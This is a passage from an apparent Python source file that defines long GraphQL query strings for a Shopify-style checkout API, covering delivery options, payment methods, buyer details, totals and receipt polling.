__typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}
"""

QUERY_POLL = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode 